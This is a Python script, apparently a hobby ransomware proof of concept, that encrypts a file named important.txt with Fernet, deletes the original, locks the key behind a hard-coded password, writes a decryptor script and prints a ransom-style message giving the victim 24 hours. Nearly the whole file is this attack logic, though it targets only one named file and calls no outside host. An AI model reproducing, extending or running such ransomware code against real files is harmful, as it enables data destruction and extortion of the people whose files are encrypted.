# encryptor.py

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64, os

# Step 1 this is where the target file is defined and can be changed for the purpose of test
target_file = "important.txt"
encrypted_file = "important.txt.encrypted"

# Step 2 key generation
fernet_key = Fernet.generate_key()
fernet = Fernet(fernet_key)

# Step 3  encryption
with open(target_file, "rb") as f:
    data = f.read()

encrypted_data = fernet.encrypt(data)

with open(encrypted_file, "wb") as f:
    f.write(encrypted_data)

# this where the org file is removed
os.remove(target_file)

# Step 4 here is the magic word. Basically kill switch which is supposed to be secret
magic_word = b"donut"  

# Step 5 create a derived key from magic word using PBKDF2
salt = os.urandom(16)
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=390000,
)
derived_key = base64.urlsafe_b64encode(kdf.derive(magic_word))
lock = Fernet(derived_key)

# Step 6: encrypt the Fernet key with the derived key
locked_key = lock.encrypt(fernet_key)

# Step 7 save salt + encrypted key to key.txt
with open("key.txt", "wb") as f:
    f.write(salt + b"::" + locked_key)

# Step 9 create the decryptor script (next to encrypted file)
with open("decryptor.py", "w") as f:
    f.write('''\
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64, os

def main():
    encrypted_file = "important.txt.encrypted"
    output_file = "important.txt"
    key_file = "key.txt"

    password = input("Enter magic word to unlock decryption key: ").encode()

    with open(key_file, "rb") as f:
        content = f.read()
    salt, encrypted_key = content.split(b"::")

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=390000,
    )
    try:
        derived_key = base64.urlsafe_b64encode(kdf.derive(password))
        fernet = Fernet(derived_key)
        real_key = fernet.decrypt(encrypted_key)
    except:
        print("Wrong magic word or corrupted key file.")
        return

    fernet = Fernet(real_key)

    with open(encrypted_file, "rb") as f:
        encrypted_data = f.read()

    decrypted_data = fernet.decrypt(encrypted_data)

    with open(output_file, "wb") as f:
        f.write(decrypted_data)

    print("File decrypted successfully.")

if __name__ == "__main__":
    main()
''')

print("Congratulations sir, your files have been encrypted. If you want them back, you have 24hours... key.txt and decryptor.py generated.")
